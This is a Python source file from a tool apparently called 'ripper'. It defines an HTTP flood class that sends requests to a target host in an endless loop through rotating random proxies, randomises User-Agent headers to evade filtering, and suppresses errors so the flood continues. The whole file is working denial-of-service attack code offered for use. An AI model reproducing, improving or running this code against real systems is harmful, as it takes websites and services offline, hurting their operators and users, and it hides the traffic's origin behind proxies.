import random
import re
from contextlib import suppress
from socket import socket
from typing import Any
from socks import ProxyError

from ripper.constants import HTTP_STATUS_CODE_CHECK_PERIOD_SEC
from ripper.context.errors import Error
from ripper.context.target import Target
from ripper.actions.attack_method import AttackMethod

HTTP_STATUS_PATTERN = re.compile(r" (\d{3}) ")
# Forward Reference
Context = 'Context'


class HttpFlood(AttackMethod):
    """HTTP Flood method."""

    name: str = 'HTTP Flood'
    label: str = 'http-flood'

    _target: Target
    _ctx: Context
    _proxy: Any = None
    _http_connect: socket = None

    def __init__(self, target: Target, context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self):
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as self._http_connect:
            self._http_connect.connect(self._target.hostip_port_tuple())
            self._ctx.target.statistic.connect.status_success()
            while self.send(self._http_connect):
                if self._ctx.dry_run:
                    break
                continue

    def check_response_status(self, payload: bytes):
        with suppress(Exception):
            if self._ctx.check_timer(HTTP_STATUS_CODE_CHECK_PERIOD_SEC):
                check_sock = self.create_connection()
                check_sock.connect(self._target.hostip_port_tuple())
                check_sock.send(payload)
                http_response = repr(check_sock.recv(32))
                check_sock.close()
                status = int(re.search(HTTP_STATUS_PATTERN, http_response)[1])
                self._ctx.target.statistic.http_stats[status] += 1

    def send(self, sock: socket) -> bool:
        payload = self.payload().encode('utf-8')
        try:
            sent = sock.send(payload)
            self.check_response_status(payload)
        except ProxyError:
            self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
        except Exception as e:
            self._ctx.add_error(Error('HTTP send Err', e))
            self._ctx.target.statistic.connect.status_failed()
        else:
            self._ctx.target.statistic.packets.status_sent(sent)
            self._proxy.report_success() if self._proxy is not None else 0
            return True
        return False

    def headers(self, content: str = '') -> dict[str, str]:
        """Prepare headers."""
        headers = self._ctx.headers_provider.headers
        headers['Content-Length'] = str(len(content))
        headers['User-Agent'] = random.choice(self._ctx.headers_provider.user_agents)

        return headers

    def payload(self, body: str = '') -> str:
        """Generate payload for Request."""
        body_content = f'{body}\r\n\r\n' if body else '\r\n'
        headers = '\r\n'.join([f'{key}: {value}' for (key, value) in self.headers(body).items()])

        request = '{} {} HTTP/1.1\r\nHost: {}\r\n{}\r\n{}'.format(
            self._target.http_method.upper(),
            self._target.http_path,
            self._target.host,
            headers,
            body_content
        )

        return request
